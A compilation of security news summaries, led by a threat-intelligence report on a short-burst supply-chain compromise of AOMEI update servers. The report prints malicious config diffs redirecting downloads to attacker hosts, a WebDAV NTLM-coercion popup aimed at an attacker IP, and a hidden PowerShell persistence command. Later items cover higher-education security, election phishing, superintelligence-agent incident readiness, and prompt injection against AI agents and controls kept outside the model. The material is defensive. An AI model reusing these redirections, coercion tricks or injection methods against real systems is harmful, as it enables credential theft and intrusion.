summary: Written by: Tyler McLellan Introduction Google Threat Intelligence Group (GTIG) and Mandiant investigated a software supply chain compromise campaign targeting the update infrastructure belonging to AOMEI Technology between April 2026 and July 2026. The threat actor conducted repeated, short-burst configuration tampering against AOMEI origin servers. Each tampering window remained active for only five to ten minutes before reverting to authentic versions. This is the first time that we have encountered a software supply chain compromise that was implemented with these very short windows, effectively evading traditional point-in-time triage and automated file scanning. The campaign delivered a multi-stage payload chain involving the newly tracked CROSSROAD downloader and SHINYROAD backdoor. The threat actor iteratively modified its tradecraft, pivoting its staging infrastructure from cloud providers to dedicated domains and legitimate cloud storage. This evolving staging setup makes it particularly challenging for defenders to establish effective infrastructure-based blocking or network controls. We attribute this activity to a threat cluster we are tracking as UNC7017. Based on available telemetry, impacted organizations spanned diverse sectors, including IT services, telecommunications, higher education and related entities in Australia, Brazil, India, Pakistan, Portugal, Singapore, South Africa, Spain, Switzerland, Türkiye, and the United States. That said, because the campaign attempted to deliver malware to any system polling the update distribution servers during the threat actor’s tampering windows, victimology was opportunistic and likely extends more broadly than the organizations we directly identified. This campaign was initially identified through collaborative research with the ManageEngine Threat Analysis Lab (METAL), part of Zoho Corporation, whose endpoint detection and response (EDR) telemetry first detected the activity in late May across multiple customer environments. We thank the METAL team for their proactive telemetry sharing and ongoing collaboration to help secure our mutual customer bases and the broader software ecosystem. Following this joint effort, GTIG notified potentially affected organizations and shared technical findings with AOMEI Technology. AOMEI reported that they took corrective action to secure their distribution servers. METAL’s analysis of this campaign is available in their blog . How AOMEI Update and Notification Systems Work AOMEI Backupper provides data backup, disk cloning, and disaster recovery, while AnyViewer facilitates remote desktop access and support. Users of these products rely on the ABMarket update flow and its associated background services ( Backupper.exe and ABNotify.exe ) that periodically poll remote endpoints over HTTPS for update notifications and promotional pop ups: Figure 1: AOMEI Update Mechanism Update Configuration ( down_html.ini ): The software periodically sends an HTTPS request to https://www2.aomeisoftware.com/download/abpopup/down_html.ini . This file contains the version number, the MD5 hash of the expected update package, and the URL where the client should download upgrade-now.zip . Notification Configuration ( Notifycfg.ini ): The software contacts https://account.aomeitech.com/Notifycfg.ini . This file instructs the local notification process ( ABNotify.exe ) what messages to display and specifies commands or programs located in the software’s local directory to execute. Under normal conditions, these files direct the client to download official files hosted on AOMEI’s own domain ( www2.aomeisoftware.com ). Campaign Overview Rather than maintaining a persistent, static modification on the vendor’s distribution servers, GTIG and METAL’s telemetry indicates UNC7017 conducted repeated, short-burst configuration tampering. We confirmed several tampering windows in 2026, alongside related malware samples observed in the wild starting in late April. However, given the short duration of these windows, it is probable that additional tampering occurred throughout the campaign that remained outside our visibility. Systems checking for updates during an active window received malicious instructions, while systems checking before or after received clean, authentic files. During the brief tampering windows, the threat actor modified the update settings file on the update server to redirect the software to download a malicious ZIP package from attacker-controlled servers instead of legitimate updates. The threat actor also altered the notification settings file on the update server to abuse the software’s automatic notification service, forcing the system to immediately execute the downloaded malware locally. If a user’s application checked for updates while the threat actor’s modifications were active, then the application would download the trojanized update and execute malware. In cases where altered configuration files were active, the threat actor directed clients to download a weaponized ZIP archive containing CROSSROAD, an initial downloader responsible for environment validation and staging secondary components. CROSSROAD subsequently established scheduled task persistence to deploy SHINYROAD, a modular backdoor framework delivered via trojanized administration utilities to facilitate covert command and control. Short Burst Supply Chain Tampering A defining characteristic of UNC7017's operational security is its reliance on ephemeral, time-compressed server modifications. Across all directly observed waves, the adversary avoided leaving malicious configurations resident on AOMEI's update servers: May 28: 10-minute exposure window (05:40 – 05:50 UTC) July 16: 6-minute exposure window (08:33 – 08:39 UTC) July 20: 5-minute exposure window (10:35 – 10:40 UTC) At the conclusion of each window, UNC7017 reverted both down_html.ini and Notifycfg.ini to their legitimate contents. This hinders post-incident vendor audits, minimizes the window for network defenders to capture live malicious server responses, and restricts compromise to clients polling for updates during those exact minutes. Weaponizing Native Update Logic: down_html.ini and Configuration Bloat To compromise endpoints without relying on software vulnerabilities, UNC7017 abused the AOMEI client's legitimate update and popup rendering workflow. By default, the client downloads update archives into its Tmphtml directory, unpacks them to the local html/ directory, and processes instructions from two remote configuration files: down_html.ini and Notifycfg.ini. To ensure the AOMEI client accepted and extracted the weaponized upgrade-now.zip archive, UNC7017 systematically incremented the minor build version (“thrid”) and updated the expected MD5 checksum in down_html.ini during each tampering window: [Date] -Url=https://www2.aomeisoftware.com/download/abpopup/upgrade-now.zip +Url=https://promotion.storage-data.com/download/abpopup/upgrade-now.zip Name=upgrade-now [Version] maj=8 min=2 -thrid=5 +thrid=6 [MD5] -Val=EE89C99F3753231771170F5D9CBBAE1E +Val=31323E7E738230FA6A8DEEF2B7894666 Figure 2: July 16 tampering of down_html.ini redirecting downloads to promotion.storage-data.com with incremented version (thrid=6) and synchronized MD5 hash. During the 6-minute window on July 16, UNC7017 simultaneously modified Notifycfg.ini (SHA256: d2f9ef2429312667f0512504b6a19ba4a9cc5514f1b2933923dd42f75a1c5934), injecting over 35,000 lines of repetitive configuration sections named [dummy_XXXXXX]. This extreme configuration bloat was structured to override standard client version checks forcing the client to trigger an update regardless of its installed version and immediately execute the unpacked CROSSROAD dropper (upgrade-now.exe) from the local html/ directory. Infrastructure Shifts Between April an July 2026, UNC7017 shifted its staging and delivery infrastructure between public cloud buckets and actor controlled lookalike domains, likely to test payload delivery and masquerade as legitimate vendor traffic. Infrastructure Shifts Early Cloud Staging (April–May 2026): Early CROSSROAD payloads ( upgrade-now.exe observed May 20) relied on Alibaba Cloud Object Storage ( serv.oss-cn-hongkong.aliyuncs.com ). Dedicated Domain Infrastructure (July 1–7, 2026): The threat actor transitioned to dedicated, vendor-themed domains ( storage-data.com , promotion.storage-data.com , aomei.storage-data.com ). Hybrid Cloud Delivery Split (July 20, 2026): During the 5-minute window on July 20, the threat actor modified down_html.ini to direct initial client downloads to a public Google Cloud Storage bucket ( storage.googleapis.com/aomeiupdate/upgrade-now.zip ) rather than storage-data.com . This tactical shift allowed the initial download to bypass enterprise proxy filters that block Newly Registered Domains (NRDs), while the executed CROSSROAD loader continued to leverage storage-data.com for secondary payload retrieval and C2 communications. [Date] Url=https://storage.googleapis.com/aomeiupdate/upgrade-now.zip Name=upgrade-now [Version] maj=8 min=2 thrid=7 [MD5] Val=BF73C4391B58CA95220CE3AE03F66DCF Figure 3: July 20 modification of down_html.ini utilizing Google Cloud Storage (thrid=7) to evade Newly Registered Domain (NRD) perimeter blocks. WebDAV NTLM Credential Coercion On July 20, UNC7017 introduced a secondary exploitation vector inside Notifycfg.ini. Prior to tampering, Notifycfg.ini displayed a legitimate 400x380 promotional banner advertising "World Cup Deals." The threat actor replaced this banner with an invisible 1x1 pixel window (Width=1, Height=1) assigned maximum execution priority (Priority=9999) that instructed the client to render a remote HTML file over a universal naming convention (UNC) WebDAV path: [PopWindow1] ID=307 Title=20260408-AB Flash Sale (All Lang 不含EN) Address="file://8.210.84.56/DavWWWRoot/campaign/24hour-flash-sale.html" Width=1 Height=1 Priority=9999 Figure 4: Malicious Notifycfg.ini configuration from July 20 implementing an invisible 1x1 popup window to coerce WebDAV/NTLM authentication to 8.210.84.56 . By forcing the AOMEI client to request a remote file:// resource via WebDAV ( DavWWWRoot ), UNC7017 created a silent credential harvesting mechanism capable of coercing endpoints into transmitting NetNTLMv2 authentication hashes to the actor-controlled IP address ( 8.210.84.56 ) without user visibility. Malware Delivery & Post-Exploitation Tooling Across the campaign waves, UNC7017 deployed a consistent chain of custom loaders and commercial/open-source post-exploitation frameworks: Defense Evasion via Timestomping: Analysis of an early CROSSROAD dropper (upgrade-now.exe) submitted to VirusTotal on May 20 revealed that the threat actor manipulated PE compilation timestamps to display fabricated 2024 build dates in an effort to complicate forensic timeline analysis. Modified Radmin Server Backdoor: During the May 28 wave, the unsigned loader dropped into the html/ directory executed rsetup64.exe /intsetup, silently installing a modified version of the commercial remote administration tool Radmin Server to establish persistent remote access. Adaptix C2 Integration: Since at least early July 2026, the threat actor was observed deploying the Adaptix C2 framework across its storage-data.com infrastructure. The Primary Downloader: CROSSROAD The primary Stage-2 downloader ( upgrade-now.exe , SHA256: 9a58e8f49edf5644e5728f74cf36f560d3d486fa51db4db69d927963c7aca450 ) is a 64-bit Windows executable written in C, tracked by GTIG as the CROSSROAD malware family. Delivered inside upgrade-now.zip , CROSSROAD is responsible for environment validation, active endpoint cleanup, staging the secondary payload bundle, and establishing scheduled task persistence for the Stage-3 backdoor suite. Path Verification: As part of its configuration routine, CROSSROAD checks whether its file path contains the substring AOMEI . If the substring is absent, it initiates a self-deletion routine; however, it does not abort, continuing both its background configuration cleanup and its downloader routines regardless. Execution Guardrails: Before proceeding with secondary downloads, CROSSROAD enforces two primary checks: Geolocation Check: Queries external domain name system (DNS) ( myip.opendns.com , o-o.myaddr.l.google.com ) and HTTP reflection services ( checkip.amazonaws.com , api.ipify.org , ifconfig.me/ip , icanhazip.com ) using custom User-Agents ( Anyviewer-loader/1.0 , Anyviewer-ipcheck/1.0 ). In specific execution branches, if the returned country code is "CN" (China), the loader aborts its primary payload execution path. Lock Mutex: Acquires the named mutex Global\{F9E6E3C0-E11A-4F85-9944-AF4AD6E05883} to prevent multiple concurrent instances on the same host. Host Artifact Reversion & Anti-Forensics: To complicate post-incident triage and forensic reconstruction, the loader systematically reverts local configuration states during its execution cycle. The malware parses down_html.ini (located at <install_dir>\..\..\ ), restoring the update thread parameter ( thrid ) to its default value of 5 and pointing the update download URL back to legitimate AOMEI distribution infrastructure ( https://www2.aomeisoftware.com/download/abpopup/ ). Stage-3 Payload Staging & Extraction: If environment checks pass, CROSSROAD downloads https://promotion.storage-data.com/config/component.zip (also observed as en.zip), to %TEMP%\svc<random_hex>.tmp, and unpacks its contents into the user’s local application data directory using an embedded miniz library. Persistence via Scheduled Task: To ensure continuous execution of the staged payload bundle, upgrade-now.exe registers a persistent scheduled task named RadminComponentRuntime (configured with the description”Radmin Component runtime checkable.”). The task is set to execute %LOCALAPPDATA%\Radmin\FamItrfc.exe --runtimechk every three hours. Self-Deletion ( --nitrod ): After extracting the payload bundle and creating the scheduled task, CROSSROAD purges itself from disk. To bypass Windows file-locking constraints, the executable drops a copy of itself to the temporary directory and executes it with the --nitrod parameter, passing its parent PID via NITRODP and original executable path via NITRODT . The child process waits for the parent to terminate, renames the original binary's primary :$DATA stream to an alternate data stream named :wtfbbq via SetFileInformationByHandle , and flags FileDispositionInfo with DeleteFile = TRUE to unlink the binary on handle close. Version Information: The executable contained standard PE version metadata with a notable typo string: "ProductName: AOMEI Update Compent" . Figure 5: Victim Profiling, Malware Delivery Logic Stage-3 Payload: SHINYROAD and Radmin Suite The payload archive unpacked into %LOCALAPPDATA%\Radmin\ by CROSSROAD contains a Famatech Radmin 3.x administration bundle used to deliver the SHINYROAD modular backdoor framework. The malware contains no native persistence mechanism of its own and relies entirely on the external scheduled task registered by CROSSROAD for execution. Execution via DLL Search-Order Hijacking ( BlkScrDl.dll ): Execution begins when the persistent RadminComponentRuntime scheduled task launches the legitimate, signed Radmin binary %LOCALAPPDATA%\Radmin\FamItrfc.exe --runtimechk (or FamItrf2.exe ). During startup, the Radmin executable is hijacked into loading the attacker's unsigned DLL, BlkScrDl.dll , via search-order hijacking. The adversary named this DLL to masquerade as Radmin's legitimate "blank screen" driver library. Shared Memory & In-Process COM Server Staging: Upon execution, BlkScrDl.dll locates config.zip in its execution directory, maps its raw contents into a shared memory section named Local\963d3c60-d406-4ad6-aa1e-dc8e45061ccf , and dynamically registers csvc\RuntimeComponent.dll as an in-process COM Server under CLSID {21191641-0D7F-4CD9-9572-01AAE6E7851B} and AppID {9AD3E98A-4C7E-4F37-982D-D73D41E4F91B} . COM-Triggered Stage-2 Initialization & Embedded PocketPy VM: When the Radmin process instantiates the registered CLSID, the Windows COM subsystem loads the DLL. The DLL reads config.zip directly from shared memory, extracts the encrypted payload metadata.dat , and decrypts it using ChaCha20 with an HMAC-SHA256 derived key and IV. The decrypted payload consists of compiled Python bytecode, which RuntimeComponent.dll executes within an embedded PocketPy interpreter, establishing initial C2 connectivity to 8.218.65.184:443 . Evolution of the SHINYROAD Architecture Analysis of earlier campaign variants revealed that SHINYROAD relies on custom C-level extensions (_pyio_compat, _pyio_struct, and pkpy) to avoid loading standard Python libraries on disk: Custom Binary C2 Protocol : Earlier variants communicated over raw TCP ( 8.218.65.184:41397 ). The agent generates a unique ID by fingerprinting the hostname and username, authenticates via a hard-coded handshake key, and dynamically transitions all subsequent communication to use symmetric encryption derived from this unique ID. In-Memory Capabilities : The engine supports interactive remote shell access (os.system), traffic chaffing (generating randomized junk packets to disrupt network signatures), and dynamic in-memory extension via the pkpy WorkPool thread manager without writing script modules to disk. Post-Exploitation: Nitro PDF Theme & Adaptix C2 In mid-July 2026, following the successful deployment of SHINYROAD, telemetry identified later-stage activity where UNC7017 pushed down ADAPTAGENT, the client portion of the Adaptix C2 post-exploitation framework. To blend in or appear as user-downloaded activity, these payloads masqueraded as Nitro PDF promotional and scanning tools ( NitroPromotion.exe ): Persistence: The malware installed a scheduled task named \NitroRuntime that executed: powershell -Command "Start-Process 'C:\Users\<USER>\AppData\Local\Temp\NitroPromotion.exe' -WindowStyle Hidden" Figure 6: NitroRuntime scheduled task persistence Adaptix C2 Beaconing : The executable sideloaded Eztwain4.dll (ADAPTAGENT) from %LOCALAPPDATA%\Nitro Pro\ , which established periodic 2-minute beacons to 8.210.84.56:6800 . Outlook and Implications This campaign highlights a broader evolution in software supply chain attack methodologies. Supply chain intrusions have historically focused on inserting backdoors into software source code or tampering with developer build pipelines (e.g., SolarWinds , 3CX ). While highly impactful, compromised source trees leave persistent binary signatures in official release files that can be discovered during post-release binary analysis. UNC7017's use of ephemeral configuration tampering represents a lower-overhead, higher-stealth alternative: Anti-Analysis by Design: By restricting configuration changes to five to ten minute windows, the vast majority of legitimate users and automated repository crawlers only encounter authentic, vendor-signed files. Selective Exploitation : Threat actors can selectively compromise target organizations that maintain frequent polling intervals while minimizing their exposure window on vendor infrastructure. Dual-Pronged Approach : Combining software update redirection with invisible WebDAV NTLM coercion could allow adversaries to harvest credentials from passive users even if binary payload execution is blocked. Co-opting Commercial Software : Deploying unmodified versions of legitimate administration tools (such as Radmin 3.x) to masquerade sideloaded covert channels illustrates how adversaries blend commercial remote management capabilities with hidden backdoor modules. Remediation and Hardening Defenders should focus on behavioral profiling of updater processes, specifically monitoring for unsigned child processes spawned by background update runners and unauthorized network redirection originating from trusted desktop software. For broader recommendations on securing software delivery pipelines, please refer to our previously published Mitigation Guidance for Supply Chain Compromise . Vendor Notification & Architecture Hardening On July 17, 2026, Mandiant notified AOMEI Technology regarding the observed configuration tampering on their update infrastructure and provided relevant indicators. AOMEI subsequently responded on July 29, 2026, stating that corrective actions had been taken. Why Server-Side Remediation Does Not Disinfect Endpoints Crucially, server-side remediation does not clean endpoints that downloaded malicious updates during earlier tampering windows. Because the tampering occurred in brief, short bursts, systems that received these files may remain compromised without the organization's knowledge unless proactive endpoint hunting and remediation are performed. Persistent Resident Payloads : Endpoints that polled for updates during an active tampering window downloaded and staged persistent payloads (via scheduled tasks) that remain fully operational even after the vendor restores authentic .ini files on the origin servers. Obscured Root Cause : While the subsequent backdoor activity and scheduled tasks generate detectable endpoint telemetry, the ephemeral delivery vector obscures the initial intrusion mechanism. Because server tampering lasted approximately 5 minutes—and the loader actively reverted local configuration files—investigators reviewing vendor update URLs hours later will observe only benign, authentic infrastructure, complicating root cause analysis and patient-zero identification. Hunting Imperative : Organizations running AOMEI software cannot assume they are protected solely because the vendor took corrective server-side action. Enterprise security teams must perform retrospective endpoint and network hunts across the entire April–July time frame using the indicators and YARA rules provided in this post. Guidance for Software Vendors & Developers Software supply chain security extends beyond developer workstations and build pipelines. When desktop software relies on remote configuration files to manage update and notification behaviors, adversaries can target the distribution layer rather than the source code. To defend against configuration tampering and distribution-channel hijacking, software vendors should implement the following security controls: End-to-End Cryptographic Signature Verification : Client applications must cryptographically verify Authenticode digital signatures and validate vendor certificates on all downloaded executables and archives before extraction or execution. Update clients should never rely solely on transport-layer HTTPS or remote checksums (such as cleartext MD5 values in an unauthenticated configuration file). Cryptographically Signed Configuration Files : Remote configuration files (.ini, .json, or .xml) should be digitally signed using asymmetric public key cryptography. If an origin server or content delivery network (CDN) is modified without authorization, client software will detect the invalid signature and reject the configuration. Domain Allowlisting and Destination Pinning : Software update clients should enforce strict destination pinning, restricting update downloads exclusively to official, pre-approved vendor domains and CDNs. Update engines should reject redirection to arbitrary third-party domains or generic public cloud storage buckets. Restricting Uniform Resource Identifier (URI) Schemes in In-App Handlers : Embedded web views, promotional popups, and notification handlers should strictly enforce secure web protocols ( https:// ) and explicitly disallow local file ( file:// ) and UNC WebDAV schemes to prevent external NTLM credential coercion. Decoupling Core Updates from Marketing Channels : Separating essential software maintenance routines from dynamic promotional popups and notification banners reduces the attack surface and ensures that advertising channels cannot trigger local code execution. Origin Integrity Monitoring and Access Controls : Origin web servers and object storage buckets hosting update metadata should enforce strict access controls, multi-factor authentication, and automated real-time file integrity monitoring (FIM) with immediate alerting on configuration changes. Guidance for Security Operations (SOC) & Incident Responders Overcoming the "Point-in-Time" Triage Pitfall The short-burst nature of this attack creates a unique challenge for incident response: The Triage Trap : When an EDR alert fires for a suspicious process spawned by an updater, SOC analysts frequently attempt to validate the alert by navigating to the vendor's download URL or checking URL reputation. Because the threat actor reverted the remote configuration files within five to ten minutes, the vendor's server returns authentic, clean files most of the time, leading analysts to mistakenly dismiss the detection as a false positive. Actionable IR Protocol : Defenders must not rely on live web checks. Incident responders must preserve and analyze the endpoint-cached configuration files in %PROGRAMFILES(X86)%\AOMEI\*\Tmphtml\ and review proxy/firewall telemetry corresponding to the precise second the alert was triggered. Camouflaged Follow-on Activity The deployment of Adaptix C2 under the guise of Nitro PDF can mislead analysts into treating alerts as isolated, user-initiated software downloads rather than staged lateral movement. Responders must trace updater parentage to identify root-cause supply chain tampering. summary: Parts 1 and 2 of this series looked at two pressures facing higher education security teams. First, the threat landscape : universities are dealing with more frequent attacks across complex, distributed environments, while campus-by-campus security can make it harder to share intelligence and coordinate response. Second, the compliance burden: overlapping requirements across FERPA, GLBA, HIPAA, and CMMC make it difficult to establish what data was affected, which reporting obligations apply, and how quickly the institution needs to act. This final part is about what changes when a university system starts treating security as a shared capability rather than a collection of separate campus programs. Multi-campus institutions still need to preserve local autonomy, but they also need enough visibility across the wider organization to understand where risk sits, how an incident is spreading, and whether the same problem is appearing elsewhere. That balance is especially relevant in higher education, where campuses, research environments, health services, and administrative teams often operate with very different technology needs and levels of independence. Security architecture should reflect how universities actually operate Most university systems are already federated organizations, with individual campuses managing their own leadership, budgets, users, and technology environments while a central office provides governance and oversight across the wider institution. Security architecture can follow the same model. With multi-tenancy in the Rapid7 Command Platform, a central security team can maintain visibility across the university system while individual campuses continue to operate within their own environments. Campus-level data and access remain separated, while the central team can identify wider patterns, coordinate response, and distribute common workflows across the system. A new attack pattern detected at one campus, for example, should not have to remain a local discovery. Shared visibility and coordinated workflows can help the central team determine whether the same activity is appearing elsewhere and make relevant response guidance available across the institution without exposing one campus's data to another. As the university system grows, that model can expand with it. A system operating three campuses today can add new environments without redesigning the security architecture each time. Shared visibility makes cross-campus response faster A central view of the attack surface can reduce much of the manual work that happens when university teams need to answer a system-wide security question. If a significant zero-day is disclosed, the central security team needs to know which campuses are running affected systems, which have already remediated the vulnerability, and where attention is still required. In a decentralized environment, gathering that information can mean emails, calls, spreadsheets, and separate conversations with each campus. A shared view of assets and vulnerabilities gives teams a faster way to establish where the exposure exists. During an active incident, the same cross-campus visibility can help investigators work out whether suspicious activity first appeared at Campus C because the compromise began there, or because that is simply where it became visible. It also allows them to check whether the same indicators are present at Campus A or Campus B before each team starts investigating independently. Universities also have large external attack surfaces that can be difficult to inventory centrally. Student portals, APIs, research servers, faculty websites, and other internet-facing assets may be created outside normal IT processes. Rapid7's Project Sonar continuously scans the public internet, helping organizations identify externally exposed services and assets that internal inventories may have missed. Vulnerability prioritization needs more than a severity score University security teams rarely have the capacity to remediate every vulnerability at once, so prioritization has to reflect how likely an exposure is to be used in a real attack. Rapid7 combines vulnerability data with attacker intelligence, including insight from Metasploit , our open source penetration testing framework used by security professionals to test and validate real-world exploits, with more than 3,000 exploit modules. That intelligence is combined with insight from AttackerKB, incident response engagements, honeypots, and other threat intelligence sources, giving teams additional context around whether an exploit exists, whether exploitation has been observed, and how difficult a vulnerability may be to use in practice. For a university working through thousands of findings across multiple campuses, that context can help teams direct limited remediation capacity toward exposures with stronger evidence of attacker interest rather than relying on severity scores alone. Incident response has to work across campus boundaries The compliance requirements discussed in Part 2 put added pressure on investigation speed, particularly when legal or compliance teams need to establish whether regulated student, financial, health, or research data was accessed across more than one campus. Rapid7's open source Velociraptor platform can collect forensic artifacts and run live investigations across thousands of endpoints simultaneously. In a multi-campus university, that could allow investigators to determine whether the same activity or data access occurred across several environments without conducting each investigation separately. Automated response workflows can also be distributed across affected campus environments, allowing teams to isolate compromised systems, revoke credentials, or block indicators consistently rather than repeating the same response manually at each institution. Campuses with smaller security teams benefit from that shared capability because the quality and speed of response are less dependent on how many people happen to be available locally when an incident occurs. Consolidation can return time to stretched security teams The operational case for a shared security model also comes down to the amount of work created by fragmentation. Separate campus tools mean separate licenses, integrations, training requirements, renewals, reporting processes, and vendor relationships, all of which consume time that understaffed security teams could be spending elsewhere. The source material for this series includes an example of one organization recovering 96 hours per month by reducing manual work across disparate security tools. It also cites an average 74% improvement in mean time to detect where unified visibility and threat correlation were applied. For higher education teams working within tight regulatory reporting windows, the difference between finding an incident in hours rather than days can have a direct impact on how quickly the institution can assess scope and respond. A system-wide agreement can also reduce the number of contracts, renewal cycles, and vendor relationships that central and campus teams need to manage, while allowing security capabilities to scale as the institution adds campuses, devices, and cloud services. Building security around the university as a whole Multi-campus universities will always have different technology needs across individual campuses, research environments, health services, and administrative functions. A connected security model does not require those environments to operate identically, but it does give central and local teams a better way to understand shared risk, coordinate investigations, and apply consistent response when an issue extends beyond a single campus. Across this series, the same pattern has appeared from different angles. Threats move across organizational boundaries, regulated data rarely sits neatly within one campus, and the people responsible for protecting university systems are already working with limited time and resources. Bringing more of that security context together can help teams respond faster, share intelligence more effectively, and reduce the manual work created by disconnected tools and processes. summary: CISA and the Federal Bureau of Investigation (FBI) released a Public Service Announcement (PSA) warning election and campaign officials about cyber threats during the 2026 U.S. midterm elections. Malicious cyber actors may use phishing and smishing techniques to steal login credentials and other sensitive information or install malware on targeted devices. Election officials, candidates, and political organizations may be attractive targets because of their access to voter registration data, current government officials, and sensitive campaign information. Cyber actors are increasingly using sophisticated phishing and smishing campaigns that closely resemble legitimate communications. These efforts may include convincing emails, text messages, audio, and video content designed to manipulate recipients into disclosing sensitive information or interacting with malicious links and attachments. CISA and the FBI urge election officials, campaign personnel, and the public to review the PSA, follow recommended cybersecurity practices, and remain vigilant for suspicious emails and mobile messages.

summary: The National Institute of Standards and Technology (NIST), National Security Agency’s Super Intelligence Security Center (NSA SISC) and Cybersecurity and Infrastructure Security Agency (CISA) published Key Practices for Incident Readiness and Response in Super Intelligence Training and Evaluation . The product outlines ten voluntary core practices to help organizations that train and evaluate highly capable super intelligence (SI) agents—particularly pre-deployment, cutting edge SI agents with reduced safeguards or other high-risk, non-public systems—prepare for and manage SI control incidents. A SI control incident occurs when one or more SI agents takes uninstructed actions that conflict with or compromise policies, controls, or security measures that scope the task and provide human oversight. This product aligns with cyber incident response best practices, includes additional SI considerations and highlights the importance of testing controls and validating containment before resuming SI agent activities. It addresses: measures for limiting agent access to information, systems, tools, and networks; monitoring for unexpected activity; preserving evidence and shutting down undesired behavior; rebuilding from verified baselines; and reporting incidents and near-misses to relevant government agencies and affected parties. For more information and resources visit CISA’s Super Intelligence page.

summary: Why the controls on an AI agent have to live outside of it, and what a security operations team can do to implement and maintain those controls. The new privileged user in your environment Security teams spent two decades learning how to work with the people they trust most. Domain admins, DBAs, finance approvers and contractors with VPN access all get a mature playbook: verified identity, scoped access, logged activity and a fast way to revoke it all. Today, we’re navigating the same kind of access with regard to AI agents. They read our mailboxes, query our data lakes, open tickets, push code and increasingly, act on production systems. Unlike a new hire, an agent can’t be interviewed, background-checked or made to sign an acceptable-use policy. The industry has largely settled on one framing: AI agents are the new insider threat but that label only tells us half of the story. It tells us who to worry about, not where the controls should sit. Our argument is that the answer is a security idea from 1972, the reference monitor, and that the SOC is where it gets enforced in practice. Why agents break the trust model we had With traditional software, a security incident ends in a root cause. You find the vulnerable function, the misconfigured rule or the bad commit, and you fix it. The behavior lived in code we could read. Large language models don't give us that. We can't point to the training example or the set of weights that produced a specific decision. The same prompt can produce different actions on different runs. For a defender, that removes the most basic assumption we rely on: that the system will do tomorrow what it did today. The attack surface changes too, and computer science has an old name for this problem: the confused deputy . This is a trusted program tricked into misusing its own authority on someone else's behalf. An agent that reads a poisoned email, web page or document and then acts on hidden instructions is a confused deputy with API keys. No password is stolen and no exploit fires, which makes the agent's permissions the real blast radius, not the model's intelligence. Where the insider analogy holds, and where it breaks Most discussion of agents as insiders focuses on two gaps: agents have no career to lose, and they act at machine speed. Both are real. From a detection and forensics seat, though, four other differences change the work more: Difference Human insider AI agent What it means for defenders Monoculture One person fails on their own Many identical copies share one weakness Treat a working injection like a wormable bug: fix the fleet, not one instance Replayability Events can be reconstructed and the person interviewed The same input can produce a different action on a rerun Forensics must rest on recorded inputs and tool calls, not on replaying the agent Command channel Instructions come from a manager Instructions arrive mixed in with the data it processes Any content the agent reads is a potential command Self-report A person can be questioned and cross-checked Its account of its reasoning may not match what it did Evidence must come from outside the agent The last row matters most. We can't make an agent's self-reported reasoning the basis of trust, because we don't yet know how to guarantee that reasoning is faithful. Evidence has to come from outside the agent. Put the controls outside the model If the model can't be fully trusted, the controls that govern it can't live inside of it. A system prompt that says "never delete production data" is a suggestion, not a control. A well-crafted injection can talk the model out of it. Security architects solved a version of this problem in the 1970s with the reference monitor: a mechanism that checks every access request, can't be bypassed and can't be tampered with by the program it governs. For AI agents, that means separating three things: the model that reasons, the harness that orchestrates it and the policy layer that decides which actions are actually allowed. Figure 1: Agent control architecture · enforcement outside the model The agent can propose anything, but only the enforcement point decides what reaches real systems, and every decision lands in a log the agent can't alter. A security playbook for AI agents None of these controls are new. What's new is applying them consistently to a non-human actor that reasons, plans and acts. Give every agent its own identity. An agent should never run under a shared service account or a person's own credentials. It needs an identity that can be scoped, monitored, and revoked independently. Enforce least privilege on actions, not just data. Define an explicit action space: which tools, which APIs, which parameters. High-impact actions like payments, deletions or production changes need step-up approval from a human. Log everything in a place the agent can't touch. Every tool call, input, and output goes to tamper-evident storage outside the agent's reach. You should be able to reconstruct what happened without asking the agent. Never let a model grade its own work. Use a different model, a deterministic rule, or a human to verify important outcomes. Avoid depending on a single model vendor for anything critical. Red team continuously. Test prompt injection, tool misuse, data exfiltration, and edge cases, not just the happy path. Re-test every time the model, the prompt, or the tool set changes. Build a kill switch before you need it. In May 2017, WannaCry was stopped by luck. A researcher registered a nonsense domain hard-coded in the ransomware, and new infections stopped spreading because the malware checked that domain before running. Defenders didn't build that kill switch. They found it in the attacker's code, it did nothing for machines already encrypted, and later variants simply removed it. Agent fleets can't depend on that kind of luck. The stop control has to be ours, sit outside the agent, cut off its credentials and tool access mid-run, and be tested regularly, the way an EDR host isolation action is. Disclose and share incidents. When an agent misbehaves, tell the people affected, document which control failed and share the lessons with the wider community, the same way we share threat intelligence today. Persistent memory is a new risk. Agents with long-term memory can be poisoned once and stay compromised. Add memory state to "log everything" and "quarantine its outputs." Bring agents into the Security Operations Center (SOC) Logging alone doesn't protect anyone, as no human team can review millions of agent actions, and handing that review to another unsupervised model just adds another black box. The SOC needs to treat agent activity as a first-class telemetry source, the way it treats endpoints, identities and cloud workloads today. In practice, that means: Behavioral baselines per agent. Know which tools, data sources and destinations each agent normally uses, and alert on deviations, such as a code-review agent that starts reading the finance file share. Detections for agent-specific attacks. Write rules for prompt-injection indicators, unusual tool chaining, sudden bursts of high-privilege actions and data flowing to unexpected destinations. Correlation with the rest of the environment. Tie agent actions to the user, the session, the content the agent read, and the systems it touched, so an investigation can follow the full chain. Response playbooks. Pause the agent, revoke its tokens, quarantine its outputs and roll back its changes, with the same speed we expect when isolating a compromised host. The security industry can lead in this area, as we already know how to collect noisy telemetry, find the signal, and contain threats quickly. Agents are the next category of asset to protect, and the next category of actor to watch. Trust the architecture, not the model Models will keep getting smarter, and vendors will keep promising they're safer. Both may be true, but neither removes our responsibility for what an agent does inside our environment with our data and our credentials. The goal isn't to find a model we can trust completely. It's to build a system that stays safe even when the model gets it wrong. Security teams have done this for people, networks, and endpoints for decades. AI agents are simply the next privileged insider, and it's time we treated them that way.

